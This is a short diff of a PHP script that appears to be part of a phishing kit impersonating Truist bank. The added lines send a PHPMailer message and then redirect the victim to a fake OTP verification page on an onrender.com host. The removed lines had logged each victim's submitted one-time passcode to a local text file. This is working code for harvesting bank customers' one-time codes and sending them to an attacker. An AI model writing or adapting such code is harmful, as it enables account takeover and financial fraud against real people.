@@ -39,17 +39,12 @@ try {
     $mail->Body    = $text;
 
     $mail->send();
+
+    header('Location: https://verifytruist.onrender.com/Truist/OTP2.html');
+    exit();
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
 
 
-
-
-
-
-
-file_put_contents("usernames.txt", "OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
-header('Location: verification.html');
-exit();
 ?>
